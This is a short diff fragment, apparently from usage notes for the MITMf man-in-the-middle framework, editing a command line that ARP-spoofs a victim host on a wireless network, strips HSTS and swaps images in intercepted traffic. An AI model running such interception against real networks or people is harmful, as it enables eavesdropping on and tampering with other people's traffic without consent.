@@ -40,4 +40,4 @@ ImportError: No module named pyinotify
   !mkvirtualenv MITMf -p /usr/bin/python2.7
   !RUN python mitmf.py --help
                  
-python mitmf.py -i wlan0 --spoof --arp --hsts --gateway <ip-router> --target <ip-victim> --imgrand --img-dir <Directory with images> /root/img/
+python mitmf.py -i wlan0 --spoof --arp --hsts --gateway "ip-router" --target "ip-victim" --imgrand --img-dir <Directory with images> /root/img/
